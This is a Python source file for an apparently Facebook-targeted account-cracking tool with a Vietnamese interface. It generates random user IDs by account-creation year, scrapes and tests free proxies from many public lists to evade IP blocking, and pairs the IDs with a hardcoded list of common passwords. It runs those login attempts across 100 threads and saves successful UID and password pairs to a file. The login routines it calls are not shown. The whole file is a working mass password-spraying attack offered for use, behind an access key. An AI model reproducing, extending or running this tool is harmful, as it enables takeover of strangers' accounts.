import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import as_completed
from os import system
from datetime import datetime
from requests.exceptions import ConnectionError, ProxyError, Timeout
from requests import api, models, sessions
import threading
from urllib3.exceptions import InsecureRequestWarning

requests.urllib3.disable_warnings(InsecureRequestWarning)

modules = ['requests', 'urllib3', 'beautifulsoup4', 'rich', 'pyperclip']
for module in modules:
    try:
        __import__(module.replace('beautifulsoup4', 'bs4') if 'beautifulsoup4' in module else module)
    except ImportError:
        os.system(f'pip install {module}')

import pyperclip

oks = []
cps = []
loop = 0
running = True

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
CYAN = '\x1b[38;5;51m'
BLUE = '\x1b[38;5;39m'
PURPLE = '\x1b[38;5;135m'
ORANGE = '\x1b[38;5;208m'
RESET = '\x1b[0m'
GREEN = G
RED = rad
YELLOW = Y

def animate_text(text, color=G, delay=0.02):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print(' \x1b[38;5;46mCông Phú DZ SERVER SUCCESSFUL LOGIN....')

if os.name == 'posix':
    try:
        os.system('espeak -a 300 " Công Phú DZ Successful"')
    except:
        pass
    try:
        os.system('xdg-open tg://resolve?domain=nhanvatva')
    except:
        pass

def loading_animation(duration=2):
    frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    while time.time() < end_time:
        for frame in frames:
            sys.stdout.write(f'\r{CYAN}[{frame}] {W}Đang tải hệ thống...{X}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write(f'\r{G}[✓] {W}Hoàn tất!{X}                \n')

def progress_bar(current, total, bar_length=30):
    if total > 0:
        percent = float(current) / total
        arrow = '█' * int(round(percent * bar_length))
        spaces = '░' * (bar_length - len(arrow))
        sys.stdout.write(f'\r{CYAN}[{arrow}{spaces}] {int(percent * 100)}% {W}({current}/{total}){X}')
        sys.stdout.flush()

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

try:
    sys.stdout.write('\x1b]2;Phú DZ Crack💥\x07')
except:
    pass

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print(f"""
{PURPLE}         ^                           {CYAN}  '       
{PURPLE}   ___ ___  _  _  ___     {CYAN} ___ _  _ _  _ 
{PURPLE}  / __/ _ \\| \\| |/ __|    {CYAN}| _ \\ || | | | |
{PURPLE} | (_| (_) | .  | (_ |    {CYAN}|  _/ __ | |_| |
{PURPLE}  \\___\\___/|_|\\_|\\___|    {CYAN}|_| |_||_|\\___/ {W}
{CYAN}═══════════════════════════════════════════{W}
{G}     PHIÊN BẢN: 3.2 PRO | By DinhCongPhu{W}
{Y}     HỖ TRỢ: ĐÀO VIA 2005-2014 + PROXY POOL{W}
{CYAN}═══════════════════════════════════════════{W}
""")

def creationyear(uid):
    if not uid:
        return 'Không xác định'
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith('1000000000'):
            return '2009'
        if uid_str.startswith('100000000'):
            return '2009'
        if uid_str.startswith('10000000'):
            return '2009'
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid_str.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid_str.startswith('100001'):
            return '2010-2011'
        if uid_str.startswith(('100002', '100003')):
            return '2011-2012'
        if uid_str.startswith('100004'):
            return '2012'
        if uid_str.startswith(('100005', '100006')):
            return '2013'
        if uid_str.startswith(('100007', '100008')):
            return '2014'
        if uid_str.startswith('100009'):
            return '2015'
        if uid_str.startswith('10001'):
            return '2016'
        if uid_str.startswith('10002'):
            return '2017'
        if uid_str.startswith('10003'):
            return '2018'
        if uid_str.startswith('10004'):
            return '2019'
        if uid_str.startswith('10005'):
            return '2020'
        if uid_str.startswith('10006'):
            return '2021'
        if uid_str.startswith(('10007', '10008')):
            return '2022'
        if uid_str.startswith('10009'):
            return '2023'
        return 'Không xác định'
    elif len(uid_str) in (9, 10):
        return '2008'
    elif len(uid_str) == 8:
        return '2007'
    elif len(uid_str) == 7:
        return '2006'
    elif len(uid_str) == 6:
        return '2005'
    elif len(uid_str) == 14 and uid_str.startswith('61'):
        return '2024'
    else:
        return 'Không xác định'

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def linex():
    print(f'{CYAN}═══════════════════════════════════════════{W}')

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
    "https://api.openproxylist.xyz/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/vakhov/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt"
]

PROXY_TIMEOUT = 3 
PROXY_TEST_URL = "http://azenv.net/" 
MAX_LIVE_PROXIES = 500 
LIVE_PROXY_THRESHOLD = 50
TEST_WORKERS = 300 
SCAN_WORKERS = 100
REQUEST_TIMEOUT = 5 

proxy_pool = []
proxy_lock = threading.Lock()
proxy_initialized = False
stop_proxy_check = False

PASSWORDS = [
    '123456', '1234567', '12345678', '123456789', '1234567890',
    'password', '123123', '111111', '000000', '12341234',
    'admin123', 'abc123', 'abcabc', 'qwerty', 'iloveyou',
    '123321', '654321', '098765', '111222', '222222',
    '888888', '999999', '12345', '12345678', 'password123',
    'admin', 'user', 'letmein', 'welcome', 'monkey'
]

def parse_proxy(line):
    line = line.strip()
    if not line:
        return None
    if '@' in line:
        return line
    parts = line.split(':')
    if len(parts) == 2 and parts[1].isdigit():
        return line
    if len(parts) == 4 and parts[1].isdigit():
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def load_proxies_from_sources(sources):
    all_proxies = set()
    print(f"\n{BLUE}[*] Bắt đầu thu thập proxy từ {len(sources)} nguồn...{RESET}")
    for url in sources:
        if not running:
            break
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                count = 0
                for line in resp.text.splitlines():
                    parsed = parse_proxy(line)
                    if parsed:
                        all_proxies.add(parsed)
                        count += 1
                print(f"{GREEN}[+] {url.split('//')[1].split('/')[0]:<30} | Lấy được: {count}{RESET}")
            else:
                print(f"{RED}[-] {url.split('//')[1].split('/')[0]:<30} | Lỗi HTTP {resp.status_code}{RESET}")
        except:
            print(f"{RED}[-] {url.split('//')[1].split('/')[0]:<30} | Kết nối thất bại{RESET}")
    return list(all_proxies)

def test_proxy(proxy):
    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        resp = requests.get(PROXY_TEST_URL, proxies=proxy_dict, timeout=PROXY_TIMEOUT, verify=False)
        if resp.status_code == 200:
            return proxy
    except Exception:
        pass
    return None

def init_proxy_pool(use_file=None):
    global proxy_pool, proxy_initialized, running, stop_proxy_check
    proxy_pool = []
    raw_proxies = []
    stop_proxy_check = False

    if use_file and os.path.exists(use_file):
        print(f"\n{CYAN}[i] Đọc proxy từ file: {use_file}{RESET}")
        with open(use_file, 'r', encoding='utf-8') as f:
            for line in f:
                p = parse_proxy(line)
                if p:
                    raw_proxies.append(p)
    else:
        print(f"\n{CYAN}[i] Tự động lấy proxy từ {len(PROXY_SOURCES)} nguồn API...{RESET}")
        raw_proxies = load_proxies_from_sources(PROXY_SOURCES)

    if not raw_proxies:
        print(f"{RED}[-] Không có proxy nào được tải! Tiếp tục không dùng proxy.{RESET}")
        proxy_initialized = True
        return

    total_raw = len(raw_proxies)
    print(f"\n{CYAN}[i] Đang kiểm tra {total_raw} proxy bằng {TEST_WORKERS} luồng (giới hạn {MAX_LIVE_PROXIES} proxy sống)...{RESET}")

    live = []
    checked = 0
    executor = tred(max_workers=TEST_WORKERS)
    futures = {executor.submit(test_proxy, p): p for p in raw_proxies}
    
    try:
        for future in as_completed(futures):
            if not running or stop_proxy_check:
                break
            checked += 1
            result = future.result()
            if result:
                with proxy_lock:
                    live.append(result)
                    if len(live) >= LIVE_PROXY_THRESHOLD:
                        print(f"\n{G}[✓] Đã có {len(live)} proxy sống.{RESET}")
                        print(f"{Y}1. Tiếp tục quét proxies (tìm thêm){RESET}")
                        print(f"{Y}2. Bắt đầu scan (dùng {len(live)} proxy hiện có){RESET}")
                        choice = input(f"{CYAN}Chọn (1/2): {RESET}").strip()
                        if choice == '2':
                            stop_proxy_check = True
                            break
                        else:
                            pass
            if checked % 500 == 0 or checked == total_raw:
                print(f"\r{G}[+] Đã kiểm tra {checked}/{total_raw}, sống: {len(live)}{RESET}", end='')
    except KeyboardInterrupt:
        running = False
        print(f"\n{YELLOW}[!] Đã nhận tín hiệu dừng, đang hủy các tác vụ kiểm tra proxy...{RESET}")
        for f in futures:
            f.cancel()
    finally:
        executor.shutdown(wait=False)

    print(f"\n{G}[✓] Hoàn tất! Có {len(live)} proxy sống sẵn sàng.{RESET}")
    with proxy_lock:
        proxy_pool = live

    if not proxy_pool:
        print(f"{YELLOW}[!] Không có proxy sống, tiếp tục không dùng proxy.{RESET}")
    proxy_initialized = True

def get_proxy():
    with proxy_lock:
        if not proxy_pool:
            return None
        return random.choice(proxy_pool)

def remove_proxy(proxy):
    with proxy_lock:
        if proxy in proxy_pool:
            proxy_pool.remove(proxy)

def safe_request_with_proxy(method, url, **kwargs):
    max_retry = 1 
    for attempt in range(max_retry):
        proxy = get_proxy()
        if proxy:
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            kwargs['proxies'] = proxies
        else:
            kwargs.pop('proxies', None)

        try:
            resp = requests.request(method, url, timeout=REQUEST_TIMEOUT, verify=False, **kwargs)
            if resp.status_code < 500 or resp.status_code in [403, 405]:
                return resp
            else:
                if proxy:
                    remove_proxy(proxy)
                continue
        except (ConnectionError, ProxyError, Timeout):
            if proxy:
                remove_proxy(proxy)
            continue
        except Exception:
            continue
    return None

def get_downloads_path():
    home = os.path.expanduser("~")
    if os.name == 'nt':
        return os.path.join(home, "Downloads")
    else:
        downloads = os.path.join(home, "Downloads")
        if os.path.exists(downloads):
            return downloads
        sdcard = "/sdcard/Download"
        if os.path.exists(sdcard):
            return sdcard
        return os.getcwd()

def save_scan_file():
    global oks, cps
    download_path = get_downloads_path()
    os.makedirs(download_path, exist_ok=True)
    file_path = os.path.join(download_path, "tai_khoan_scan.txt")
    mode = 'a' if os.path.exists(file_path) else 'w'
    with open(file_path, mode, encoding='utf-8') as f:
        if mode == 'w':
            f.write("UID|Password|Năm via|Trạng thái|Thời gian scan\n")
        current_time = datetime.now().strftime("%H:%M:%S | %d/%m/%Y")
        for uid, pw, year in oks:
            f.write(f"{uid}|{pw}|{year}|OK|{current_time}\n")
        for uid, pw, year in cps:
            f.write(f"{uid}|{pw}|{year}|CP|{current_time}\n")
    print(f"\n{G}[✓] Đã lưu tất cả tài khoản đã scan vào {file_path}{W}")

def copy_to_clipboard(text):
    try:
        pyperclip.copy(text)
        print(f"{G}[✓] Đã copy vào clipboard: {text}{W}")
    except:
        pass

def check_key():
    approved_keys = ["toanmod999", "phudz2025"]
    print(f"{CYAN}[!] Tool yêu cầu nhập key để sử dụng.{RESET}")
    attempts = 0
    while attempts < 3:
        user_key = input(f"{Y}Nhập key: {W}")
        if user_key in approved_keys:
            print(f"{G}[✓] Key hợp lệ! Bắt đầu...{RESET}\n")
            return True
        else:
            attempts += 1
            print(f"{RED}[!] Key sai! Còn {3 - attempts} lần thử.{RESET}")
    print(f"{RED}[!] Hết lượt thử. Thoát.{RESET}")
    sys.exit(1)

def BNG_71_():
    global running
    running = True
    ____banner____()
    loading_animation(1.5)
    linex()
    print(f'   {PURPLE}[1] {W}CRACK VIA {Y}(2005-2014){W}')
    linex()
    print(f'   {PURPLE}[2] {W}CRACK VIA {Y}(Tùy chỉnh năm){W}')
    linex()
    print(f'   {PURPLE}[3] {W}XEM THỐNG KÊ THÀNH CÔNG{W}')
    linex()
    print(f'   {PURPLE}[0] {rad}THOÁT CHƯƠNG TRÌNH{W}')
    linex()
    __Jihad__ = input(f'   {CYAN}[?] {W}CHỌN TÙY CHỌN {Y}: {G}')
    if __Jihad__ in ('1', '01'):
        old_clone()
    elif __Jihad__ in ('2', '02'):
        custom_year_mode()
    elif __Jihad__ in ('3', '03'):
        show_stats()
    elif __Jihad__ in ('0', '00'):
        save_scan_file()
        animate_text("Cảm ơn bạn đã sử dụng Scan Via Của DinhCongPhu!", PURPLE)
        sys.exit()
    else:
        print(f"\n    {rad}[!] Vui lòng chọn tùy chọn hợp lệ!")
        time.sleep(2)
        BNG_71_()

def show_stats():
    ____banner____()
    print(f"{CYAN}╔═══════════════════════════════════════════╗{W}")
    print(f"{CYAN}║{W}          THỐNG KÊ CRACK THÀNH CÔNG       {CYAN}║{W}")
    print(f"{CYAN}╚═══════════════════════════════════════════╝{W}")
    print(f"\n{G}[✓] Tổng tài khoản thành công: {Y}{len(oks)}{W}")
    print(f"{G}[✓] Tổng checkpoint: {Y}{len(cps)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_clone():
    ____banner____()
    print(f'   {PURPLE}[1] {W}CRACK TẤT CẢ CÁC SERIES {Y}(2005-2014){W}')
    linex()
    print(f'   {PURPLE}[2] {W}CRACK SERIES 100003/4 {Y}(2011-2012){W}')
    linex()
    print(f'   {PURPLE}[3] {W}CRACK SERIES 2009 {Y}(Tùy chỉnh){W}')
    linex()
    print(f'   {PURPLE}[0] {rad}QUAY LẠI{W}')
    linex()
    _input = input(f'   {CYAN}[?] {W}CHỌN TÙY CHỌN {Y}: {G}')
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"\n{rad}[!] Vui lòng chọn tùy chọn hợp lệ!")
        time.sleep(2)
        old_clone()

def custom_year_mode():
    global oks, cps, loop, running
    running = True
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack theo khoảng năm tùy chỉnh{W}")
    linex()
    year_range = input(f"   {CYAN}[?] {W}NHẬP KHOẢNG NĂM (VD: 2005-2014) {Y}: {G}")
    try:
        start_year, end_year = map(int, year_range.split('-'))
        if not (2004 <= start_year <= end_year <= 2025):
            print(f"{rad}[!] Khoảng năm không hợp lệ (2004-2025)")
            time.sleep(2)
            BNG_71_()
            return
    except:
        print(f"{rad}[!] Định dạng sai, vui lòng nhập dạng 2005-2014")
        time.sleep(2)
        BNG_71_()
        return

    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    try:
        limit = int(input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}"))
    except ValueError:
        print(f"   {rad}[!] Vui lòng nhập số hợp lệ!")
        time.sleep(2)
        BNG_71_()
        return
    linex()

    user = generate_ids_by_year(start_year, end_year, limit)
    if not user:
        print(f"{rad}[!] Không thể tạo ID cho khoảng năm này.")
        time.sleep(2)
        BNG_71_()
        return

    progress_bar(len(user), limit)
    print(f"\n{G}[✓] Đã tạo {len(user)} ID thành công!{W}")
    linex()
    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1 {Y}(Nhanh){W}')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2 {Y}(Chính xác cao){W}')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP {Y}(Khuyến nghị){W}')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    if meth in ('1', 'A'):
        meth = 'A'
    elif meth in ('2', 'B'):
        meth = 'B'
    elif meth in ('3', 'C'):
        meth = 'C'

    print(f"\n{CYAN}[~] Đang chuẩn bị proxy...{RESET}")
    try:
        init_proxy_pool()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Đã dừng lấy proxy, tiếp tục không dùng proxy.{RESET}")
        running = False
    if not proxy_pool:
        print(f"{YELLOW}[!] Không có proxy, vẫn chạy nhưng dễ bị chặn IP.{RESET}")
    else:
        print(f"{G}[✓] Đã có {len(proxy_pool)} proxy sẵn sàng.{RESET}")
    time.sleep(1)

    oks = []
    cps = []
    loop = 0

    with tred(max_workers=SCAN_WORKERS) as pool:
        ____banner____()
        print(f"{CYAN}╔═══════════════════════════════════════════╗{W}")
        print(f"{CYAN}║{W}          BẮT ĐẦU CRACK TÀI KHOẢN         {CYAN}║{W}")
        print(f"{CYAN}╚═══════════════════════════════════════════╝{W}")
        print(f"\n{G}[+] Tổng ID: {Y}{len(user)}{W}")
        print(f"{G}[+] Khoảng năm: {Y}{start_year}-{end_year}{W}")
        print(f"{G}[+] Phương thức: {Y}{meth}{W}")
        print(f"{G}[+] Workers: {Y}{SCAN_WORKERS} luồng{W}")
        print(f"{G}[+] Proxy pool: {Y}{len(proxy_pool)}{W}")
        linex()

        try:
            for uid in user:
                if not running:
                    break
                if meth == 'A':
                    pool.submit(login_1, uid)
                elif meth == 'B':
                    pool.submit(login_2, uid)
                elif meth == 'C':
                    pool.submit(login_combined, uid)
            pool.shutdown(wait=True)
        except KeyboardInterrupt:
            running = False
            print(f"\n{YELLOW}[!] Đã nhận tín hiệu dừng, đang hủy các tác vụ crack...{RESET}")
            pool.shutdown(wait=False)

    save_scan_file()
    print(f"\n\n{G}╔═══════════════════════════════════════════╗{W}")
    print(f"{G}║{W}          HOÀN THÀNH CRACK                 {G}║{W}")
    print(f"{G}╚═══════════════════════════════════════════╝{W}")
    print(f"{G}[✓] Thành công: {Y}{len(oks)}{W}")
    print(f"{Y}[~] Checkpoint: {rad}{len(cps)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def generate_ids_by_year(start_year, end_year, limit):
    user = []
    prefixes = []
    for year in range(start_year, end_year + 1):
        if year == 2004:
            prefixes.extend(['1' + '0' * (4 - len(str(i))) + str(i) for i in range(10000, 100000)])
        elif year == 2005:
            prefixes.extend(['1' + '0' * (5 - len(str(i))) + str(i) for i in range(100000, 1000000)])
        elif year == 2006:
            prefixes.extend(['1' + '0' * (6 - len(str(i))) + str(i) for i in range(1000000, 10000000)])
        elif year == 2007:
            prefixes.extend(['1' + '0' * (7 - len(str(i))) + str(i) for i in range(10000000, 100000000)])
        elif year == 2008:
            prefixes.extend(['1' + '0' * (8 - len(str(i))) + str(i) for i in range(100000000, 1000000000)])
        elif year == 2009:
            prefixes.extend(['1000000', '1000001', '1000002', '1000003', '1000004', '1000005', '100000000', '1000000000'])
        elif year == 2010:
            prefixes.extend(['1000006', '1000007', '1000008', '1000009', '100001'])
        elif year == 2011:
            prefixes.extend(['100002', '100003'])
        elif year == 2012:
            prefixes.append('100004')
        elif year == 2013:
            prefixes.extend(['100005', '100006'])
        elif year == 2014:
            prefixes.extend(['100007', '100008'])
        elif year == 2015:
            prefixes.append('100009')
        elif year == 2016:
            prefixes.append('10001')
        elif year == 2017:
            prefixes.append('10002')
        elif year == 2018:
            prefixes.append('10003')
        elif year == 2019:
            prefixes.append('10004')
        elif year == 2020:
            prefixes.append('10005')
        elif year == 2021:
            prefixes.append('10006')
        elif year == 2022:
            prefixes.extend(['10007', '10008'])
        elif year == 2023:
            prefixes.append('10009')
        elif year == 2024:
            prefixes.extend(['1001', '61'])
        elif year == 2025:
            prefixes.append('1002')
    if not prefixes:
        return []
    for _ in range(limit):
        prefix = random.choice(prefixes)
        if len(prefix) < 15:
            suffix_len = 15 - len(prefix)
            suffix = ''.join(random.choices('0123456789', k=suffix_len))
            uid = prefix + suffix
        else:
            uid = prefix
        user.append(uid)
    return user

def old_One():
    global oks, cps, loop, running
    running = True
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack toàn bộ tài khoản cũ 2005-2014{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    try:
        limit = int(input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}"))
    except ValueError:
        print(f"   {rad}[!] Vui lòng nhập số hợp lệ!")
        time.sleep(2)
        old_One()
        return
    linex()

    user = []
    for _ in range(int(limit * 0.1)):
        uid_len = random.choice([6,7,8,9,10])
        uid = ''.join(random.choices('0123456789', k=uid_len))
        user.append(uid)
    for _ in range(int(limit * 0.2)):
        prefix = random.choice(['100000','1000001','1000002','1000003','1000004','1000005','1000006','1000007','1000008','1000009'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)
    for _ in range(int(limit * 0.7)):
        prefix = random.choice(['100001','100002','100003','100004','100005','100006','100007','100008'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)

    progress_bar(len(user), limit)
    print(f"\n{G}[✓] Đã tạo {len(user)} ID thành công!{W}")
    linex()
    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1 {Y}(Nhanh){W}')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2 {Y}(Chính xác cao){W}')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP {Y}(Khuyến nghị){W}')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    if meth in ('1', 'A'):
        meth = 'A'
    elif meth in ('2', 'B'):
        meth = 'B'
    elif meth in ('3', 'C'):
        meth = 'C'

    print(f"\n{CYAN}[~] Đang chuẩn bị proxy...{RESET}")
    try:
        init_proxy_pool()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Đã dừng lấy proxy, tiếp tục không dùng proxy.{RESET}")
        running = False
    if not proxy_pool:
        print(f"{YELLOW}[!] Không có proxy, vẫn chạy nhưng dễ bị chặn IP.{RESET}")
    else:
        print(f"{G}[✓] Đã có {len(proxy_pool)} proxy sẵn sàng.{RESET}")
    time.sleep(1)

    oks = []
    cps = []
    loop = 0

    with tred(max_workers=SCAN_WORKERS) as pool:
        ____banner____()
        print(f"{CYAN}╔═══════════════════════════════════════════╗{W}")
        print(f"{CYAN}║{W}          BẮT ĐẦU CRACK TÀI KHOẢN         {CYAN}║{W}")
        print(f"{CYAN}╚═══════════════════════════════════════════╝{W}")
        print(f"\n{G}[+] Tổng ID: {Y}{len(user)}{W}")
        print(f"{G}[+] Phương thức: {Y}{meth}{W}")
        print(f"{G}[+] Workers: {Y}{SCAN_WORKERS} luồng{W}")
        print(f"{G}[+] Proxy pool: {Y}{len(proxy_pool)}{W}")
        linex()

        try:
            for uid in user:
                if not running:
                    break
                if meth == 'A':
                    pool.submit(login_1, uid)
                elif meth == 'B':
                    pool.submit(login_2, uid)
                elif meth == 'C':
                    pool.submit(login_combined, uid)
            pool.shutdown(wait=True)
        except KeyboardInterrupt:
            running = False
            print(f"\n{YELLOW}[!] Đã nhận tín hiệu dừng, đang hủy các tác vụ crack...{RESET}")
            pool.shutdown(wait=False)

    save_scan_file()
    print(f"\n\n{G}╔═══════════════════════════════════════════╗{W}")
    print(f"{G}║{W}          HOÀN THÀNH CRACK                 {G}║{W}")
    print(f"{G}╚═══════════════════════════════════════════╝{W}")
    print(f"{G}[✓] Thành công: {Y}{len(oks)}{W}")
    print(f"{Y}[~] Checkpoint: {rad}{len(cps)}{W}")
    linex()
    input(f"\n{CYAN}[ENTER]{W} để quay lại menu...")
    BNG_71_()

def old_Tow():
    global oks, cps, loop, running
    running = True
    ____banner____()
    print(f"   {CYAN}[i] {W}CHẾ ĐỘ: {G}Crack series 100003/100004{W}")
    linex()
    print(f"   {CYAN}[!] {Y}VÍ DỤ: {G}20000 / 50000 / 99999{W}")
    try:
        limit = int(input(f"   {CYAN}[?] {W}SỐ LƯỢNG ID CẦN CRACK {Y}: {G}"))
    except ValueError:
        print(f"   {rad}[!] Vui lòng nhập số hợp lệ!")
        time.sleep(2)
        old_Tow()
        return
    linex()

    user = []
    for _ in range(limit):
        prefix = random.choice(['100003','100004'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix + suffix)

    print(f'   {PURPLE}[A] {W}PHƯƠNG THỨC 1')
    print(f'   {PURPLE}[B] {W}PHƯƠNG THỨC 2')
    print(f'   {PURPLE}[C] {W}PHƯƠNG THỨC KẾT HỢP')
    linex()
    meth = input(f"   {CYAN}[?] {W}CHỌN PHƯƠNG THỨC {Y}(A/B/C): {G}").strip().upper()
    if meth in ('1', 'A'):
        meth = 'A'
    elif meth in ('2', 'B'):
        meth = 'B'
    elif meth in ('3', 'C'):
        meth = 'C'

    print(f"\n{CYAN}[~] Đang chuẩn bị proxy...{RESET}")
    try:
        init_proxy_pool()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Đã dừng lấy proxy, tiếp tục không dùng proxy.{RESET}")
        running = False
    if not proxy_pool:
        print(f"{YELLOW}[!] Không có proxy, vẫn chạy nhưng dễ bị chặn IP.{RESET}")
    else:
        print(f"{G}[✓] Đã có {len(proxy_pool)} proxy sẵn sàng.{RESET}")
    time.sleep(1)

    oks = []
    cps = []
    loop = 0

    with tred(max_workers=SCAN_WORKERS) as pool:
        ____banner____()
        print(f"{G}[+] Tổng ID: {Y}{limit}{W}")
        print(f"{G}[+] Series: {Y}100003/100004{W}")
        print(f"{G}[+] Workers: {Y}{SCAN_WORKERS} luồng{W}")
        print(f"{G}[+] Proxy pool: {Y}{len(proxy_pool)}{W}")
        linex()
        try:
            for uid in user:
                if not running:
                    break
                if meth == 'A':
                    pool.submit(login_1, uid)
                elif meth == 'B':
                    pool.submit(login_2, uid)
                elif meth == 'C':
                    pool.submit(login_combined, uid)
            pool.shutdown(wait=True)
        except KeyboardInterrupt:
            running = False
            print(f"\n{YELLOW}[!] Đã nhận tín hiệu dừng, đang hủy các tác vụ crack...{RESET}")
            pool.shutdown(wait=False)

    save_scan_file()
